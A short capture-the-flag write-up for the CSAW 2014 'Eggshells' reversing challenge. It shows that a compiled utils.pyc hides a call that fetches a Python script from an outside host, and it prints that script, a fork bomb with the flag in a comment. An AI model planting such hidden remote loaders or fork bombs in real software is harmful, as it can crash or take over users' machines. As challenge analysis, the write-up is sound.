# Eggshells (Reversing 100)

This first reversing problem was quite easy. First, we downloaded and unzipped the provided file.

```
$> ls -R egshells-master
capstone.py  distorm.py  interpreter.py  main.py  nasm  nasm.py  server.py  shellcode.py  utils.pyc  wrapper.py

./nasm:
LICENSE  nasm.exe  ndisasm.exe  rdoff

./nasm/rdoff:
ldrdf.exe  rdf2bin.exe  rdf2com.exe  rdf2ihx.exe  rdf2ith.exe  rdf2srec.exe  rdfdump.exe  rdflib.exe  rdx.exe
```

There are lot of files in here, but we immediately notice that we were given a compiled utils.pyc, while the rest
of the files in the root directory are regular python files. That seems like a good place to hide a flag. Let's run strings 
on it.

```
$> strings eggshells-master/utils.pyc
urllib2s
http://kchung.co/lol.pyN(
__import__t
urlopent
read(
/Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.pyt
<module>    
```

Now let's check out that file on kchung.co

```
$> curl http://kchung.co/lol.py
import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
```

Lol, forkbomb. 

That was pretty easy.
